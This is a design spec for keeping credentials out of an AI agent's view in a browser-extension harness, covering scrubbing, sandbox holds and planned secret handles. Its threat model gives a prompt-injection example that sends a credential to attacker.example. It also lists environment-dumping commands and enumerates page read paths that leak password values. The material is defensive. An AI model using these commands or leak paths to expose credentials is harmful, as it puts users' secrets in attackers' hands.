# Idea: secrets an agent can use but never read

**Status: this file owns what the model can see of a secret; the handles are not started.** Written down on 2026-09-15
as an idea to come back to. Built since: the secret registry, scrubbed by value at every crossing (#1948, e8508959;
"The scrub as built", below), and the parts the table below marks built. The handles are not, and the sketch under
[Shape](#shape-a-sketch-unvalidated) is a guess to be argued with, not a design.

## What the model can see of a secret: the one table (2026-11-24)

A secret can reach a model in two ways: its VALUE turns up in text the model reads, or the model reads the FILE that
holds it. The two tables below say what the model sees for each, by surface and by platform, and what is built. Every
other spec keeps its mechanism and points here for the answer. Where another file disagrees with these tables, that
file is wrong and gets repaired. Read from main at 81192e50 and window-ml-host 0.10.0 (main at 9f99501), before
window-ml-host#58.

**A value in text.** A registered value is one in the registry ("The scrub as built": at most 64 entries, 8 to 512
characters, matched as written and in its JSON, percent, base64 and shell forms).

| Where the value would cross | What the model sees | State |
| --- | --- | --- |
| A tool result, the lines the loop appends, an `ml.sh` head and each `ml.sh.read` range, live output, a peek tail, a resumed history, the utility model's calls, what the run stores beside a result, a nested ask | `[REDACTED:<NAME>]` in place, and one count line on a tool result | built (#1948) |
| A model request a page started; an error answered to a page | a bare `[REDACTED]`, no name, no count | built (#1948) |
| What the person sends (the turn, a right-clicked element, attached text) | `[REDACTED:<NAME>]`, unless the person sent it as is | built by registered value (ruling 39); the shape detector is not |
| A session row leaving the worker (lists, search, the hub, the HUD) | `[REDACTED:<NAME>]` | built (ruling 61) |
| Bytes read from `/files` (`ml.fs`, Python's mount) | each byte of a match is `*`, so sizes and offsets hold | built; the per-secret fake value and the write-back (rulings 100, 101) are not |
| A file's NAME under `/files` that holds a registered value | the listing shows the raw name; the file block of the turn shows it redacted | a defect (the session-store lane's account, 2026-11-24), repaired in the reader |
| A GitHub token, registered or not | `[a GitHub token]`, by its shape | built, the one pattern there is |
| Any other unregistered key shape (`sk-`, `AKIA`, a JWT, a PEM block, URL userinfo) | the value | not built (scrub PR 2; ruling 39's detector for the person's input) |
| A value in a password field of a page | the value | ruled (30), not built |
| A value of a hidden file that a program the person allowed prints | the value, unless it is registered | open design ("Open questions", below) |
| A value in an image; a value cut, reversed or encoded outside the forms above; a value under 8 characters; the model's own tool arguments | the value | stated limits |

**A file that holds secrets.** Three readers exist. The `/files` reader serves the browser's copy of a session's files
to `ml.fs`, Python's mount and the file browser. A program started through `ml.sh` is bound by the host's sandbox, which
differs by platform. A call run `host-plain` is bound by nothing.

| File | `/files` reader | `ml.sh` program, macOS (Seatbelt) | `ml.sh` program, Linux (bubblewrap, Landlock) |
| --- | --- | --- | --- |
| `.env`, `.env.*` (not the templates `.env.example`, `.env.sample`, `.env.template`) | name listed with `hidden: true`; a read is refused in words naming it as hidden; built (#2088) | name listed; read EPERM and write denied, at any depth | name listed; read EACCES and write EROFS at each root's TOP only, and `$HOME/.env`; `root/app/.env` is READABLE (the stated gap) |
| `.netrc`, `.git-credentials`, `.pgpass` | held at a root's top, as above | unreadable at any depth | held at each root's top and under `$HOME`; deeper, readable |
| Credential directories (`.ssh`, `.gnupg`, `.aws`, `.azure`, `.kube`, `.docker`, `.password-store`, Keychains, `.config/gh`, `.config/gcloud`) | not a default of the browser copy | unreadable at any depth | masked under `$HOME` only |
| `*.pem`, `id_*` and other secret-looking names inside a root | readable | READABLE; `rg pattern .` reads `root/key.pem` | the same |
| A path a `hide` policy matches | held like a dotenv file; built (#2088) | not applied: a `spawn` carries no entry until window-ml-host#58 and its extension half | the same; then resolved when the call starts, so a file made later is readable to that call |
| A path a `show` policy matches | released, readable and writable | not applied, as above | the same |
| A held path NAMED in a call's marked path argument | not applicable | the call asks; approved, that path's READ is re-allowed for that call, and nothing else | the call asks; approved, the path is readable. Two DEFECTS at host 0.10.0 (the files-host lane's reading of `src/sandbox.rs`, 2026-11-24; the second checked by the coordinator): a named file at a root's top is also WRITABLE, and a named file under a credential directory unmasks the WHOLE directory for that call (`~/.ssh/id_ed25519.pub` named, the private key readable). Both are repaired on window-ml-host's main by its #59 (50430e62, 2026-11-24): a named secret opens only itself, for reading only. A released host carries the repair from the next tag after 0.10.0 |

- **A hidden file's NAME is listed everywhere, and its content nowhere.** That is Shane's position (2026-11-24): the
  model should know a `.env` exists. No reader leaves the name out.

- **A secret-looking name that is not held is flagged, never hidden.** The host's name check (`secret` on a path
  argument: `.env`, `*.pem`, `id_*`, `.ssh/` and the rest of `SECRET_PATTERNS`) makes a call that NAMES such a path
  ask. It does nothing for a program that walks to the file.

- **Who may free the ask on a named held path.** As built, the read is outside the free tier and a policy may answer
  it. As ruled (34; [`POLICIES.md`](POLICIES.md), "Hiding files"), no `allow` policy frees it and the durable way is a
  `show` entry. The ruled form lands with the host half of the hide list.

- **One secret does reach a process today.** A credentialed `gh` call gets the person's GitHub token as `GH_TOKEN`
  from the host ([`PROGRAM_MANIFEST.md`](PROGRAM_MANIFEST.md), "The credentialed profile"). It always asks, the worker
  never holds the value, and a printed token is scrubbed by its shape.

- **The masked state is ruled and not built** (ruling 113, 2026-11-24; "A masked file", at the end of this file). When
  it is built, the dotenv row above changes on every reader: the name is listed, a read gives the keys with each value
  replaced, a write through the extension's own code puts the real values back, a program the person allowed reads the
  real file, and every other program reads the masked copy or is refused. Until then the row stands as written.

**Where each part's detail lives.**

| Part | Owner |
| --- | --- |
| The registry, its forms, each crossing, the limits | this file, "The scrub as built" |
| `hide` and `show` entries, the defaults' ids, which entry wins, the card and the command | [`POLICIES.md`](POLICIES.md), "Hiding files" |
| What the sandbox holds on each platform, and each gap | window-ml-host's SANDBOX.md; the `hiddenSecrets` and `secret` facts in its PROTOCOL.md |
| The `/files` reader, its length-keeping mask, hidden files in a backup | [`FILE_ATTACHMENTS.md`](FILE_ATTACHMENTS.md) |
| The credentialed `gh` call | [`PROGRAM_MANIFEST.md`](PROGRAM_MANIFEST.md) |
| A value typed into a prompt (`getpass`, a program's stdin) | [`SHELL_INTERACTIVE.md`](SHELL_INTERACTIVE.md), with the answers in "Amendments", below |

**What each ruling's state is.** Built: the registry scrub (#1948), ruling 39's scrub of the person's input by
registered value, ruling 61 (session rows), ruling 34's entries in the extension's readers (#2088). Not built: the
handles; the key-shape patterns but the GitHub token's; rulings 30 (page password fields), 32 (hash-only entries), 33
and 94 (the inbox item), 93 (personal details), 100 and 101 (the write-back), 113 (the masked file); ruling 34's host
half.

## The idea

Let an agent act with my credentials (an API token, a session) without the credential ever entering its context,
its tool results, the run log or an export. The model gets a handle it can pass to the places that need it, and
there is no operation that turns the handle back into the secret.

The browser already has this shape: a WebCrypto `CryptoKey` created with `extractable: false` can sign and decrypt,
and no API will hand you its bytes.

It came out of the read-only `exec` dialect ([`docs/dev/readonly-exec.md`](../dev/readonly-exec.md)), where what a
script can express is already the permission. A secret handle is the same move for authority: what the dialect
cannot say, the model cannot do.

## Threat model first

Hiding the value is the easy half. These are the ways a secret leaks anyway, and a design is only as good as its
answer to each.

1. **Exfiltration by destination.** `send({ auth: handle, url: "https://attacker.example/" })`. If the model chooses
   where the credential goes, it is gone, and a prompt injection on the page is exactly what would ask for that. A
   secret has to be bound to where it may be sent, the way `FETCH_SHEET` is hard-locked to `docs.google.com`.
2. **Reflection.** The legitimate destination sends it back: an endpoint that echoes request headers (httpbin's
   `/headers`), an error saying `invalid token ghp_…`, a debug field. The response lands in the model's context. A
   scrubber can remove the exact value and its common encodings (base64, URL-encoding), but a partial or transformed
   echo gets past it: redaction lowers the rate, it does not close the hole.
3. **Authority, not value.** An agent that cannot read a GitHub token can still delete a repository with it. Hiding
   the value does not limit what the value can do. The grant has to be attenuated: which origin, which methods,
   which paths, perhaps read-only.
4. **The page world.** `window.ml`, the read-only dialect and an approved `exec` all run in the page's main world,
   which a hostile page owns: it can patch `fetch`, read any object reachable from a global, and watch outgoing
   requests. So the secret can never be in the page, not even inside a closure. It stays in the service worker, and
   the request that carries it is made there.
5. **Oracles and side channels.** A response that differs by some property of the secret (its length, a prefix
   match on a lookup endpoint) leaks bits over several calls. Unlikely for bearer tokens, worth a sentence per API.
6. **Forged handles.** If a handle is just a name (`"github"`), the model can write one. That is only safe if the
   authority lives in the run's GRANT rather than in the handle: a forged handle then reaches only what the run was
   already allowed to use.

## Shape (a sketch, unvalidated)

- **Secrets live only in the service worker**, stored when I add them, each with a scope written at the same time:
  exact origins, allowed methods, path prefixes, and where it goes in the request (`Authorization: Bearer …`, a
  header name, a cookie).
- **A run is granted secrets by name**, the way a run is given tools today. The grant is what carries authority; the
  handle the model sees (`ml.secret("github")`) is an empty, frozen, null-prototype object holding no data, so
  `JSON.stringify`, `Object.values`, spread and string coercion have nothing to find.
- **The only sink is a background fetch**: something like `ml.fetch(url, { auth: handle })`. The worker checks the
  URL against the secret's scope, injects the credential, makes the request, scrubs the response, and returns it.
- **Approval** does not fit the dialect's rule, because a request has effects. It needs a third category: an effect
  through a declared, scoped capability. Asked once per run and secret, perhaps, and then free inside the scope.
- **Logs and exports** show the handle as `[secret: github]` and never the value, on every surface, including the
  raw model-facing view AGENTS.md requires.

## How it meets the other specs (2026-10-15)

The idea was written before policies, the effect algebra, the process host and the Python dialect existed on paper. Each
of them has a place for it, and together they answer parts of the threat model above.

- **A secret's scope is a policy.** The origins, methods and path prefixes written when the secret is stored are a
  predicate over a call's resolved facts, attached to the secret and evaluated like any other
  ([`POLICIES.md`](POLICIES.md)); it is the fifth hand-rolled grant store in that spec's table. Attenuation (threat 3)
  is then the same mechanism as every other "decide this without asking": a person narrows a scope the way they narrow
  a policy, on the one page that lists them.
- **In the effect algebra a secret is a resource with one operation.** `use(secret(name))` exists; `read(secret(name))`
  does not, in any vocabulary ([`EFFECTS.md`](EFFECTS.md)). A policy can see that a call carries a secret
  (`c.effects.uses("github")`) and bind it to a destination, which is threat 1 as a set predicate. A file the host flags
  as secret-looking is `read(fs(path))` with `secret: true`, inside no bound at all, the sandbox's included, because
  the harm is disclosure and no enforcer bounds that.
- **Processes are a sink**, and the biggest one ([`SHELL.md`](SHELL.md), "Security invariants"). A script names the
  handle in `env` (`{ GITHUB_TOKEN: ml.secret("github") }`); the policy sees the NAME; the host injects the value at
  spawn, into the environment or a credential helper, only for a program whose manifest may receive that secret.
  Reflection (threat 2) is answered by scrubbing the registered values from a process's output before any script or
  model reads it (`scrubSecrets` in `src/secret-scrub.ts` is the existing form of this, for the backend's own secrets).
  AMENDED 2026-11-17 (the coordinator's call, under ruling 18's order): the scrub sits in the WORKER, not the host, so a
  registered value can pass between the stages of a pipe on the host, and the host's `sha256` and `size` are over the
  raw bytes ("The scrub as built", below). A program whose manifest says it `echoes` its environment is refused with a
  secret present ([`PROGRAM_MANIFEST.md`](PROGRAM_MANIFEST.md)); that refusal lands with the handles slice, since until
  then no REGISTERED secret can reach a process (the one value a process is handed is the GitHub token of a
  credentialed `gh` call, which the host holds and the worker never does; the table at the top). In host mode the person's own credential files and helpers are on disk,
  which the secret path flag and the scrubbed environment are for.
- **A secret lives beside its sink.** The worker holds the ones `ml.fetch` injects; the host holds the ones processes
  need (the OS keychain is the natural store); a handle names a secret wherever it lives, and the grant is evaluated
  where decisions are made, in the worker. The value never travels to a place that only decides.
- **On the wire a handle is a tagged name**, `{ "$secret": "github" }`, and never a value in either direction
  ([`ML_WIRE.md`](ML_WIRE.md)). Threat 6 (forged handles) is answered as the sketch hoped: the authority is the run's
  grant, so a forged name reaches only what the run already had.
- **In the Python dialect a handle is a receiver kind with no attributes and no methods**, whose `repr` is
  `[secret: github]`, passable only to an `ml` member whose manifest lists `use(secret)`
  ([`PYTHON_DIALECT.md`](PYTHON_DIALECT.md)). The persistent namespace holds the handle, never a value, because the
  value never enters any Python process. The JS dialect gets the same kind, and a script that names `ml.secret` never
  runs in the page's main world (threat 4), by the rule that already routes `ml.current` and `ml.sh` to an isolated
  world (`execNames` in `src/sw/exec-routing.ts`).
- **The backend's own URL and key are the built-in secret**, already handled this way: never to a page or the model
  (`src/sw/sw-scrub.ts`), never to a process.

## Scrubbing is by VALUE, in the harness, and says when it fired (2026-10-21)

From an incident on the GPU box the same day (the mlbox session's report): an agent read a container's environment
through a filter it wrote itself, `grep -vi "pass\|key\|token"`, and a live password printed anyway, because it sat in
the VALUE of a variable whose name gives no hint, inside a URL's userinfo (`...=tasmota@http://user:password@host`).
The value was in a gitignored `.env` the whole time. What that fixes in this spec's wording:

- **A denylist of NAMES written by the agent per command is the wrong layer.** Secrets hide in values of harmless keys
  (URLs, DSNs, connection strings, command lines), and a one-off filter under time pressure misses them. The scrub
  belongs between a tool's raw output and anything that reads it (the model, a pipe, a log, an export), and it never
  depends on the agent remembering. `scrubSecrets` already sits there for the backend's own secrets; the rule is that
  it takes a REGISTRY (every value the person marked secret, from a listed `.env`, the keychain, a handle's value) and
  runs on every tool result, file read and process output, matching the value and its obvious encodings (URL-encoded,
  base64, JSON- and shell-escaped). By value there are no false negatives for a known secret.
- **Patterns are the second line, for what nobody registered**: URL userinfo (redact the password, keep the host),
  `Authorization: Bearer|Basic`, the common key shapes (`sk-`, `ghp_`, `AKIA`, a JWT, a PEM block), `password=` and
  `secret=` pairs, a high-entropy token beside a credential word. Lower precision, so a match is replaced with a
  placeholder, never a refused call.
- **Commands that dump an environment are known to the manifest**, which is what `echoes` already says
  ([`PROGRAM_MANIFEST.md`](PROGRAM_MANIFEST.md)): `env`, `printenv`, `set`, `docker inspect`, `docker exec … env`,
  `/proc/*/environ`, `ps e`, `systemctl show -p Environment`, `kubectl get secret`, `git config -l`, a read of a `.env`
  or a credentials file. Refused with a secret present, scrubbed otherwise; a manifest that misses one is a finding.
- **A registered value in a tool's INPUT is flagged too**: the command line is logged as well, so a secret belongs in a
  handle or a temporary env file, never in argv.
- **The output says it was touched**: `[REDACTED:PLUG_PASSWORD]` in place, and "1 secret redacted (PLUG_PASSWORD)"
  appended, name and count only, never the value, so the model does not conclude the value is absent. The check "does
  this output contain secret X" is offered as a count, which is the practice that was already in use by hand.
- **The same scrub runs on persisted transcripts and exports**, so an unregistered secret that slipped through is fixed
  after the fact: register the value, re-scrub what is stored, report which sessions held it, and the person decides
  on rotation.

The test that discriminates: `FOO_SOURCES=a=x@http://u:REALSECRET@10.0.0.1` with `REALSECRET` in a registered `.env`
comes out redacted by value; the same line with it unregistered comes out redacted by the userinfo pattern. Not
built; this is the shape the scrub grows into, recorded so the next builder does not start from a name list. Being
built, 2026-11-17: "The scrub as built", below.

## The scrub as built (2026-11-17)

The order is Shane's (ruling 18: H10, containment, this scrub, H11 to H16, handles last). The worker seat, the
registry's source and the bounds below are the coordinator's calls, 2026-11-17, under that order. Two PRs: the registry
by exact value first, the key-shape patterns second, each pattern on by default only with a false-positive rate measured
on real captured output in its PR.

- **The seat is the worker.** Every text that crosses from the worker into a script or the model passes one scrub,
  [`forModel`](../../src/sw/sw-scrub.ts) extended with the registry:
  - a tool result, at the agent loop's hook ([`agent-loop.ts`](../../src/agent/agent-loop.ts), `deps.forModel`), in
    the worker-hosted loop;
  - a page-started model request, where it leaves the worker for the backend
    ([`background.ts`](../../src/background.ts), `FETCH_LLM` and the stream port, keyed on the sender, never on anything
    the page says): no registered value leaves the worker to a model backend in a page-started request. Every message
    role is scrubbed, the user's included (the page composed all of them), with a bare `[REDACTED]`, no name and no
    count line, so a registered name never reaches the model a page drives, and nothing is reported back to the page: no
    count, no flag, no difference in an answer. This covers the page-hosted loop
    ([`ml-agent-run.ts`](../../src/ml/ml-agent-run.ts)), whose scrub cannot run in the page (threat 4); a page-reachable
    scrub message would be an oracle and does not exist (the coordinator's call, 2026-11-17, under ruling 18's order);
  - the lines the loop appends after that hook (the `@tool:` line, the cut line, the budget line);
  - an `ml.sh` output's head and every `ml.sh.read` range, where they cross from the worker into the script
    ([`sh-call.ts`](../../src/shell/sh-call.ts) `headText`, [`sw-shell-call.ts`](../../src/sw/sw-shell-call.ts)), and
    the run's token store keeps the scrubbed head: a script never holds a registered value, so nothing it returns,
    logs or passes on can carry one. A `python_exec` cell reaches `ml.sh` only over the `ml` wire, whose `sh.run` and
    `sh.read` members call the same two functions ([`sw-ml-wire.ts`](../../src/sw/sw-ml-wire.ts)), so it meets the
    same two crossings and no other;
  - a tool's live output to the sidebar (`streamOutput`, emitted before the hook and kept in the JSON export): the
    text so far, scrubbed whole at each delta, its tail held back as a head's is;
  - a running call's peek tail, which reaches the model through `forModel` already (the task's tail and its stored
    value, [`sw-shell-call.ts`](../../src/sw/sw-shell-call.ts) `peekTail`, and the task messages);
  - a resumed run's history ([`forModelHistory`](../../src/sw/sw-scrub.ts)), so a value registered after a session
    was stored is scrubbed from what a resumed model is sent, though the stored session still holds it;
  - the utility model's calls ([`forModelMessages`](../../src/sw/sw-scrub.ts), on `utilityCall`): a session's title,
    made from its task, and every `side.call`, in every role, on copies; the call is not sent when the registry cannot
    be read;
  - the run log's `key`, which keeps an error's raw text for extension pages: the registry's values are scrubbed from
    it, and the backend's own URL, key and filter stay there as today;
  - what the run keeps beside a tool result (`forStored`, the loop's `scrubStored`): the tool's Out render, which the
    sidebar and both exports draw, and so a pointer's fuller capture, which a later `@tool:` read hands a script or the
    model. Every string in it is scrubbed as the result is, without the count line; image data is not scanned;
  - a nested ask as the step's event keeps it ([`sw-asks.ts`](../../src/sw/sw-asks.ts), `forStored` through
    `AskRun.keep`, ruled 2026-11-19): its facts, why it asks, the person's note and the call's outcome, each failing
    closed to withheld. The session server and so the chat page, the phone and a backfill, the store, the DevTools
    ring, the cross-page replay and both exports hold that copy, a registered value as `[REDACTED:<NAME>]`. The raw
    facts of an ask still waiting reach only the live card the person answers from (the page's card and overlay, a
    DevTools panel already open) and are dropped when it settles; an export taken while it waits leaves its facts out.
    A policy judges the raw facts, held in the worker's memory; `run.approvals` and the external approver read the kept
    copy. A nested ask offers no "remember", and its run-log records carry only its kind and seq. A step an older build
    stored with its ask's raw facts is scrubbed as it is read back from the store, which is not rewritten;
  - an error answered to a page (`forPage`): every string under an error key, at any depth beneath it, the config's
    secrets and then each registered value as a bare `[REDACTED]`, so a page never learns a name. It waits for the
    registry and fails closed to "The request failed."
- **The host does not scrub.** A process's held output stays its raw bytes, so a registered value can pass between
  the stages of a pipe on the host (an OS pipe, which never crosses into the worker); it is scrubbed before any script
  or model reads it. `done`'s `sha256` and `size` are over the raw bytes. A scrubbed read says so: a text range comes
  back with its matches replaced, a binary range as scrubbed bytes with `scrubbed: <n>`, and either may be shorter or
  longer than `length`.
- **A cut never lets a prefix through.** A read range is fetched with a margin of the longest registered form on each
  side and scrubbed whole, and a match that overlaps the range is replaced where it overlaps. A head whose last bytes
  are the start of a registered form is cut before them, and its `complete` is false.
- **The registry**, by name and value, is `ml_secret_registry` in `chrome.storage.local` (never sync), declared in the
  state registry beside its store. It is class secret under [`MODEL_SETTINGS.md`](MODEL_SETTINGS.md) ("Not settings,
  never writable"): never in `GET_CONFIG`, `ml.settings()` or an answer to any page-reachable message, never written by
  `change_setting`, and not a key of `MlConfig`. The person adds an entry in the DevTools Settings panel, through a
  message only an extension page may send; the panel gets names and a count back, never a value. The backend's own
  URL, key and model filter stay the built-in entries (`secretsOf`). Bounds, each refused when an entry is added:
  at most 64 entries; a value of 8 to 512 characters (a shorter one would match ordinary text, and the margins and
  the base64 forms grow with a longer one); a NAME matching `[A-Z0-9_]{1,40}`, since it is written into model-facing
  text. `ml_secret_registry` is in no backup, export or archive-folder file (the backup inventory classes it `never`),
  the state inspector shows its names and a count, never a value, and the housekeeping log records a read of the store
  that failed (`secrets`/`registry-unreadable`), with no name and no value.
- **Before the registry is read, no crossing reads it as empty.** The worker starts the read when it starts. A crossing
  that can wait (a tool result, a page-started request, an `ml.sh.read` range) awaits it; one that cannot (a live
  output's delta, the loop's appended lines, the run log's `key`) shows nothing, or a held-back line, until it is done.
  A store that cannot be read fails each waiting crossing closed and is read again by the next one, and a change the
  store reports while the first read is in flight wins over that read.
- **The forms matched** for each value: as written, JSON-escaped, percent-encoded, base64 (standard and URL-safe, at
  each of the three byte alignments a value can take inside a longer base64 run) and shell-escaped (single-quoted with
  `'\''`, and backslash-escaped).
- **The output says it was touched.** Each match becomes `[REDACTED:<NAME>]`, and the tool result ends with one line,
  `1 secret redacted (PLUG_PASSWORD)`, names and a count, never a value. What the run stores and exports is what the
  model saw, so the sidebar (its live output included), the run log and both exports never hold a registered value
  that arrived after it was registered.
- **Known limits**: images; what the person or a page sends is scrubbed by registered value only (ruling 39, PR 1: the
  turn's words, a right-clicked element, its files' text and the page context a run starts with, behind
  `scrubPersonInput`), so a token in it that is neither registered nor the extension's own key reaches the model until
  the shape detector (ruling 39, PR 3); a value that was transformed or only partly echoed (threat 2); a value
  registered after a session stored it (re-scrubbing stored sessions is a later slice); anything a pattern does not know
  until PR 2 (the one pattern applied today is the GitHub token's shape, `GITHUB_TOKEN` in `src/secret-scrub.ts`); a script or model that already holds a guess can confirm it, by echoing the guess and seeing the marker;
  the model's own tool arguments, which are not scrubbed; an approved page that drives a model can confirm a full guess
  it already holds if the model repeats the marker, and learns no name; the page-world tool results of a page-hosted run
  stay the page's own and are not scrubbed for the page; a page whose own text comes back in an error (a refusal that
  quotes what it refused) can confirm that a guess equals a registered value, by seeing `[REDACTED]` where its text was,
  though never which one; a registered value at rest in the value store behind a pointer (a `fetch_url` page's whole
  text, a stored table) until PR 2 scrubs it where it is written: every model-bound read of it (a `@tool:` read, a
  pipe's head, range or grep, the output of a script that called `ml.dereference`) crosses the scrub, so what remains is
  the value at rest and an approved script that reads it and transforms it before printing; a registered value inside an
  answer's `data` to a page (anything not under an error key) is not scrubbed, since the data is the handler's answer
  and only the error text is the worker's own; `GET_CONFIG`'s answer to a page is not run through the registry, by
  design, since what keeps a secret out of it is `publicConfig`'s fixed key list (`redteam-lifetimes-config.test.mjs`,
  #1942, enumerates it, no secret key among them), and a public value equal to a registered one reaches the model only
  through a crossing that scrubs it (a page-started request, or a tool result that read the page); when the registered
  secrets cannot be read, the stored scrub (`forStored`, which takes an object's keys as it takes its values) keeps a
  key only when it has a schema's shape (letters only, lowercase first, at most 32: `type`, `byColumn`), so the record
  keeps its shape, and a registered value of that shape used as a key survives that path.
- **Deferred to the handles slice**: reading values from a listed `.env` (a new host message), the keychain, a handle's
  value, and the `echoes` refusal.

## Open questions

- Is per-API scoping bearable to set up, or does it need presets (GitHub read-only, one Google Sheet)?
- Can scrubbing be made good enough for the APIs that matter, or do some APIs have to be marked as echoing and
  refused outright?
- Where does the model's authority stop: can a handle be passed to a server-side tool (OpenWebUI) at all, given
  that the server would then hold it?
- Does this belong in the harness only, or also on the server, for model-provider keys a client should never hold?
- **Scrubbing a hidden file's values (RULED 2026-11-24, ruling 113; "A masked file", at the end of this file).**
  Shane: reading a dotenv file and registering its values is a convenience worth having, which the person can switch
  off per file, with the person registering values themselves as the ideal. That reverses the coordinator's earlier
  recommendation against it. The text below is the design as it stood before the ruling, kept for its objections,
  each of which the ruled section answers or states as a limit. The sandbox keeps a hidden file (a dotenv file, a
  credential file, and a path a `hide` policy
  holds once the host applies those entries) unreadable, but a program the person runs can still load it and print
  a value, and the registry scrub ([#1948](https://github.com/parawanderer/window-ml/pull/1948)) catches only values
  the person registered. The idea: the host parses a hidden file when the call is spawned and sends its STRING LEAVES
  to the worker, which adds them to the session's registry, so an echoed value is scrubbed like a registered one. What
  it would take, and what stands against it:
  - *Formats.* Dotenv, JSON, YAML and TOML, parsed by the host's own fixed parsers. A parser the person supplies is
    refused: parsing a hidden file is running code over its bytes, and the sandbox exists so that nothing does.
  - *Which leaves.* String leaves of 8 to 512 characters, the registry's bounds. A shorter value stays the channel's
    to hold, not the scrub's.
  - *False positives.* A config file's leaves are mostly not secret (`localhost:5432`, `production`, a URL), and every
    leaf of 8 or more characters would be redacted wherever it appears, in output that never touched the file. A
    choice by key name (`*_KEY`, `*_TOKEN`) is a heuristic and is left out; the person registering values is the
    precise path.
  - *A redaction oracle the person did not choose.* With a hidden file's leaves in the registry, a script that guesses
    a leaf and prints the guess learns it was right by seeing it redacted. Config leaves are low-entropy (a port, a
    hostname, an environment name), so guessing is cheap, and unlike a registered value the person never chose to
    expose this check.
  - *The 64 cap.* The registry holds at most 64 entries; a dotenv file can hold more than that alone. Values from
    hidden files would need their own bound and the fail-closed rule page values have: at the bound nothing held is
    dropped, and output from the call stops crossing.
  - *The host-to-worker crossing.* The values would leave the host process for the worker in plaintext over the
    native port, a crossing that no secret makes today. Kept, they belong where page values are kept
    (`chrome.storage.session`, never the local store). Over the hub, the crossing refused is the host's to a REMOTE
    runtime: a host reached through the hub never sends a hidden file's leaves, in any form, to the runtime across
    devices; only the host's own machine's worker could receive them.
  - *A hash-only route.* The host could send ruling 32's `mask` entries instead (`L`, `F` and `C` per form), never the
    value. The cost: the host must hold the filter key and run a second `valueForms`, pinned to the worker's by shared
    vectors so both derive the same forms; and the weak-value limit applies in full, since a config leaf is exactly
    the low-entropy value a stolen hash gives to offline guessing.
  - *Relation to handles.* Reading a listed dotenv file's values is already deferred to the handles slice, where a
    value is used without being read; this would be the scrub half of the same reading, and is decided with it.

## Prior art

- **WebCrypto non-extractable keys**: use without read, enforced by the platform.
- **Object capabilities** (the E language, Mark Miller; SES / Hardened JavaScript): authority carried by unforgeable
  references, attenuated by wrapping them. Sealer/unsealer pairs are close to the handle here.
- **Macaroons**: bearer tokens that carry their own caveats (origin, expiry, path), attenuated by the holder.
- **CI secret masking** (GitHub Actions redacts registered secrets from logs): the redaction half, and a record of
  how often transformed values get past it.

## Amendments after the scrub (2026-11-18)

Four rulings of Shane's that build on the registry scrub ([#1948](https://github.com/parawanderer/window-ml/pull/1948),
"The scrub as built"). The coordinator's calls under each are marked as such and were surfaced to Shane. Of this
section, ruling 39's scrub by registered value and ruling 61 are built; the rest is not (the list under the table at
the top). Ruling 30's value scrub lands after scrub PR 2, its channel mask with handles; ruling 32 lands before
handles; ruling 33 lands once ruling 32's store and its Settings page exist; ruling 39's by-value half lands after
#1948, its shape half in its own PR. Rulings 40 to 42 and 44 settle four of ruling 39's open points, and ruling 43
adds LLM provider tokens to its shape list; all five are written into its section. Rulings 93 and 94 (2026-11-20) add
a third kind, the personal detail, and the inbox item's text for the three kinds.

### Page password fields are masked from the model (ruling 30)

**What is held.** A value in a password-class field (below) that the run's own `type` calls did not write. The
exemption is exact: a field is exempt only while its current value EQUALS what the run's own `type` calls wrote into
it. A value the person typed, one the browser or a password manager filled, and one the run typed part of and someone
else completed are all held. A click that reveals a value (a "show password" control, the model's click included)
exempts nothing. The worker knows what its own `type` calls wrote; that is the only exemption.

**Password-class**, each decided per field and sticky for the page's life once true:

- `type=password`, and a field that was `type=password` and was switched to another type (a show toggle);
- an `autocomplete` attribute with any of the tokens `current-password`, `new-password`, `one-time-code`,
  `cc-number` or `cc-csc`, matched as tokens (`section-x billing cc-number` counts);
- a computed `-webkit-text-security` of `disc`, `circle` or `square` on a non-password input, which banks use for PIN
  and card fields;
- in the page's own document, its same-origin frames and its open shadow roots.

Considered and left out: guessing by `name` or `id` (`pin`, `cvv`, `ssn`), which would mask far more ordinary text
than it protects.

**Two mechanisms, landing at different times.**

1. *The value scrub* (after scrub PR 2). Every value seen in a held field joins the session's registry, kept in
   `chrome.storage.session`: in memory, NEVER ON DISK, never written to `ml_secret_registry`, and surviving the worker's
   eviction (an MV3 worker is stopped after about 30 seconds idle). It has to survive it, because #1948 scrubs stored
   text when it is READ (`forStored`): a set lost with the worker would leave a page value already in the session's
   stored output unscrubbed in the sidebar, the exports and a `@tool:` read. The session's page values stay in
   `chrome.storage.session` always and are never written to the local store, where a stolen profile would give a weak
   page password to offline guessing; once ruling 32's matcher exists they MAY be held in `chrome.storage.session` in
   its hash-only form. The worker reads the fields of each tab the run has touched with a tool at the start and end of
   every tool call on that tab, and again when a result from that tab is about to cross to the model. It keeps every
   value it has seen for the session, not only the current one, so a value read by an approved script and then changed
   is still scrubbed. No keystroke listener. From there the scrub is the registry's: the same forms, the same crossings,
   `[REDACTED:<NAME>]` with a generated name (`PAGE_PASSWORD_1`). The row: a value seen, the worker restarted, and the
   session's stored output still scrubbed. The bound (proposal): at most 256 values a session. At the bound, nothing
   held is dropped: results from a tab with a held field stop crossing, each answered with a line saying the session
   holds more masked values than it can scrub, and the run log records it.
2. *The channel mask* (with handles; ruling 25 needs it too). Every read path the dialect and the DOM survey have
   answers `"filled"` for a held field's value, and the field is blanked in screenshots and in what a vision model is
   shown. The read paths, as a list the red team's rows are written from; a path not on it is a defect in the list:
   - the `value` and `defaultValue` properties, and `.value.length`;
   - `valueAsNumber` and `valueAsDate`;
   - for a password-class `textarea`, its `textContent`, `innerText` and `defaultValue`;
   - the validity surface, which tells length and pattern membership: `validity.tooShort`, `tooLong` and
     `patternMismatch`, the `:valid` and `:invalid` pseudo-classes, and `checkValidity()`;
   - the `value` attribute (`getAttribute`, `attributes`), which a server re-renders after a failed submit;
   - `outerHTML` and `innerHTML` of the field or of any ancestor, and any other serialisation of an ancestor
     (`XMLSerializer`);
   - `FormData` over the form, `form.elements`, and a `URLSearchParams` built from either;
   - the selection APIs over the field (`selectionStart`/`selectionEnd` with the value, `getSelection`);
   - an attribute selector on `value` (`input[value^="a"]`), which answers one character at a time;
   - the accessibility tree a CDP read returns, which carries a text field's value once it is not `type=password`;
   - the page's URL after a GET submit of a form holding the field (the value scrub covers this one, for values of 8
     characters or more);
   - a screenshot, and what `look` and `locate` show a vision model.

**A tab holding a held field** (coordinator's call). While it does, an unmediated main-world `exec` on that tab asks,
and the card names the field. The residual, stated plainly: an approved script can read the value and re-encode it
(reversed, base64, one character a line) before printing, and only the channel mask, not the scrub, stands in front
of that.

**Frames and shadow roots.** A same-origin frame and an open shadow root are inside the mask. A cross-origin frame (a
payment frame) is out of the dialect's reach, so it gets the screenshot mask only, when CDP can locate the field
